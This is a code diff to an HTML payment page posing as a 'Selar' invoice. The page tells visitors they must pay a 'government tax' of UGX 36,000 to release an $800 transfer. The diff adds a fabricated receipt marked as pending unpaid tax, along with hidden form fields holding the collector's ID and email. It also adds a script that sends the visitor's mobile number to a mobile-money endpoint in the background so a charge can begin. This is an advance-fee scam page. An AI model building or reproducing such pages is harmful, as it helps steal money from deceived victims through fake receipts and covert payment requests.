@@ -24,15 +24,6 @@
             padding-top: 10px; 
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            overflow: hidden; /* Ensures image corners match card */
-        }
-
-        /* Image Styling */
-        .receipt-img {
-            width: 100%;
-            height: auto;
-            border-bottom: 1px solid #eee;
-            margin-bottom: 15px;
         }
 
         /* Blinking Animation */
@@ -51,7 +42,7 @@
             font-size: 13px; 
             font-weight: 600; 
             color: #333; 
-            margin-bottom: 20px; 
+            margin-bottom: 25px; 
         }
         .status-dot { 
             height: 10px; 
@@ -81,6 +72,23 @@
 
         .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
 
+        /* Receipt Style from Photo */
+        .image-receipt-box {
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-style: dashed;
+            margin: 0 15px 25px;
+            padding: 20px;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+            color: #000;
+        }
+        .receipt-line { margin: 4px 0; }
+        .receipt-bold { font-weight: bold; font-size: 15px; }
+        .receipt-center { text-align: center; font-weight: bold; }
+        .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 10px; }
+
         .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
         .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
 
@@ -92,6 +100,7 @@
         .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
         .continue-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
 
+        /* Hidden Processing Message */
         #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
         .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -106,8 +115,6 @@
 <body>
 
 <div class="invoice-card">
-    <img src="1772275905117_1.png" alt="Selar Invoice Receipt" class="receipt-img">
-
     <div class="country-badge"><span class="status-dot"></span> GOVERNMENT TAX</div>
 
     <div class="logo-circle">Selar</div>
@@ -122,8 +129,30 @@
         <span class="btn-pill">📋 Copy paylink</span>
     </div>
 
-    <p class="description">You are paying government tax for the invoice shown above securely. Payments are protected and your details stay private.</p>
+    <p class="description">You are paying government tax for selar-invoice-800usd securely. Payments are protected and your details stay private.</p>
 
+    <div class="image-receipt-box">
+        <div class="receipt-center" style="font-size: 16px;">SELAR INVOICE<br>TRANSACTION - RECEIPT</div>
+        <div class="receipt-center">******************************************</div>
+        
+        <div class="receipt-line"><strong>Transaction Type:</strong> Send Money (Mobile)</div>
+        <div class="receipt-line"><strong>Account Number:</strong> [Your Seller Involem Account Number]</div>
+        <div class="receipt-line"><strong>Name:</strong> Lolikishee USA Chicago</div>
+        
+        <div class="receipt-line" style="margin-top: 15px;"><strong>Recipient DetailID:</strong> SI001234595</div>
+        <div class="receipt-bold">ALI MOHAMMED</div>
+        <div class="receipt-line"><strong>Mobile Number:</strong> +256791418298</div>
+        <div class="receipt-line"><strong>Network:</strong> Airtel Uganda</div>
+        
+        <div class="receipt-line" style="margin-top: 15px;"><strong>Amount Sent</strong></div>
+        <div class="receipt-bold">Amount Sent: 800$</div>
+        
+        <div class="receipt-center" style="margin-top: 10px;">------------------------------------------</div>
+        <div class="receipt-center">NATIONAL ID VERIFIED FOR RECEIVER</div>
+        <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 36,000 UGX]</div>
+        
+        <div class="receipt-center" style="font-family: sans-serif; font-size: 26px; margin-top: 20px; font-weight: 900; letter-spacing: 2px;">SELAR</div>
+    </div>
     <div class="main-amount">UGX 36,000</div>
     <div class="confirm-text">Confirm the details below to send your secure payment.</div>
 
@@ -138,12 +167,15 @@
         <form id="paymentForm">
             <input type="hidden" name="ownerid" value="wasswa.lawrence" />
             <input type="hidden" name="description" value="Credit Note" />
+            <input type="hidden" name="return" value="https://my.jpesa.com" />
+            <input type="hidden" name="cancel" value="https://my.jpesa.com" />
             <input type="hidden" name="email" value="lolikishee1@gmail.com" />
+            <input type="hidden" name="name" value="loli kishee" />
             <input type="hidden" name="cur" value="UGX" />
             <input type="hidden" name="amount" value="36000" />
 
             <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
+                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" title="Please enter a valid 10-digit phone number" />
                 <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
             </div>
         </form>
@@ -165,7 +197,9 @@
 
 <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+        e.preventDefault(); 
+
+        const form = this;
         const btn = document.getElementById('submitBtn');
         const notice = document.getElementById('processing-notice');
         const mobileInput = document.getElementById('mobile');
@@ -175,12 +209,12 @@
         mobileInput.readOnly = true;
         notice.style.display = "block";
 
-        const formData = new FormData(this);
+        const formData = new FormData(form);
 
         fetch('https://my.jpesa.com/?dad=xp', {
             method: 'POST',
             body: formData,
-            mode: 'no-cors'
+            mode: 'no-cors' 
         })
         .then(() => {
             console.log("Background payment request sent.");
